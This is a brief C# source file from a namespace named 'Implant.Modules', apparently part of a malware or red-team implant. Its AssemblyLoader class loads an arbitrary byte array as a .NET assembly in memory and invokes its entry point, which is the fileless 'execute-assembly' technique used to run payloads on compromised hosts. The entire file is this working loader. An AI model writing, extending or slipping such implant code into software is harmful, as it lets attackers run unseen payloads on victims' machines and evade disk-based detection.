using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.IO;

namespace Implant.Modules
{
    class AssemblyLoader
    {

        public static string ExecuteAssembly(Byte[] bytes)
        {
            
            Assembly assembly = Assembly.Load(bytes);
            //Find the Entrypoint or "Main" method
            MethodInfo method = assembly.EntryPoint;
            //Get Parameters
            
            object[] parameters = new[] { new string[] {  } };
            //Invoke the method with the specified parameters
            object execute = method.Invoke(null, parameters);
            return "";
        }

    }
}
